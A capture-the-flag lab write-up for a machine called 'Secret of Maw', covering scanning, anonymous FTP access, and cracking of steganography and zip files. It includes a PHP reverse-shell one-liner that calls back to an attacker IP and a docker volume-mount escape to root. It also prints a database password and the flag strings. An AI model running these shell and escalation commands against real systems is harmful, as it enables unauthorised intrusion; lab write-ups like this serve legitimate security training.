# Secret of Maw

## Enumeration
```bash
tarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 13:54 BST
Nmap scan report for 10.10.29.3
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Maw
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
```
```bash
ftp <IP>

get .nomes

└─$ cat nomes 
You find a nome hidding around, you hug it... You feel a little bit relieved!
```
```
/discrete
```
## Exploitation

### On this page we can execute a command but there are shell restrictions

```bash
'p''h''p' -r '$sock=fsockopen("10.8.37.214",4445);exec("sh <&3 >&3 2>&3");'
```

### I got a shell as six user
### I upgrade my shell with this command
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Privilege Escalation
```bash
sudo -u six /home/six/.musicbox

cd /home/six
```

## User FLAG
```cat user.txt``` : EPI{I_MuS7_F1nD_@_W4y_0Ut}

### I used wget to download the files in /var/www 
```bash
└─$ stegseek musicbox.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "nightmare"
[i] Original filename: "backup.zip".
[i] Extracting to "musicbox.jpg.out"
```

### I thought I had found something but it was a rabbit hole
```bash
mysql -u root -p : !@m+her00+@db

mono : a596a5afee6659e857db41cd41497102 : not found 

└─$ echo SV9NdVN0X1N0MHBfVGgzX1RoaW5fbTRu | base64 -d
I_MuSt_St0p_Th3_Thin_m4n 
```
### I used zip2john to crack the backup.zip password

I forgot to write the command

### I got a hash that I cracked with john
```bash
unzip backup.zip : Telekinesis
```
### In the file of the .zip folder, I found a password hash in base64
### I go on the ssh session of the user, I did sudo -l and found a command with specific write using docker
```
docker run -it -v /:/mnt alpine chroot /mnt
```
## Root FLAG
```cat /root/root.txt``` : EPI{Th3_Th1N_M4n_1S_C0m1Ng}

### Source 
https://tiagotavares.io/2020/12/chillhack-1-vulnhub/ | https://blog.keiran.scot/privilege-escallation-with-docker-56dc682a6e17



